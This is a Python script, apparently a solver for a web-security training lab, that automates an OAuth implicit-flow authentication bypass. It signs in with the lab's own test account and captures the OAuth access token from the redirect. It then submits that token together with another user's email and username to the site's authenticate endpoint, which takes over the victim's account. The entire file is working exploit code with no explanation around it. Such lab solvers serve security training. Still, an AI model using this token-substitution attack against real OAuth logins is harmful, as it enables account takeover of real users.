import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.my_account_username = 'wiener'
        self.my_account_password = 'peter'
        self.request_authorization_url = None
        self.oauth_service_api_url = None
        self.user_login_and_consent_url = None
        self.oauth_token = None
        self.victim_email = 'carlos@carlos-montoya.net'
        self.victim_username = 'carlos'

    def sign_in_as_my_account(self):
        response = self.session.get(self.lab_url + 'my-account')
        self.request_authorization_url = re.findall('<meta.*url=(.*)\'>', response.text)[0]
        self.oauth_service_api_url = self.request_authorization_url.split('/auth')[0] + '/'

    def request_authorization(self):
        response = self.session.get(self.request_authorization_url)
        self.user_login_and_consent_url = re.findall('<form autocomplete="off" action="(.*?)"', response.text)[0]

    def login_and_consent_and_access_granted_token(self):
        data = {
            'username': self.my_account_username,
            'password': self.my_account_password
        }
        response = self.session.post(self.oauth_service_api_url + self.user_login_and_consent_url.lstrip('/'),
                                     data=data)
        continue_url = re.findall('<form autocomplete="off" action="(.*?)"', response.text)[0]
        response = self.session.post(self.oauth_service_api_url + continue_url.lstrip('/'))
        self.oauth_token = re.findall('access_token=(.*?)&', response.history[-1].text)[0]

    def sign_in_as_victim(self):
        data = {
            'email': self.victim_email,
            'username': self.victim_username,
            'token': self.oauth_token
        }
        self.session.post(self.lab_url + 'authenticate', json=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_my_account()
        self.request_authorization()
        self.login_and_consent_and_access_granted_token()
        self.sign_in_as_victim()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
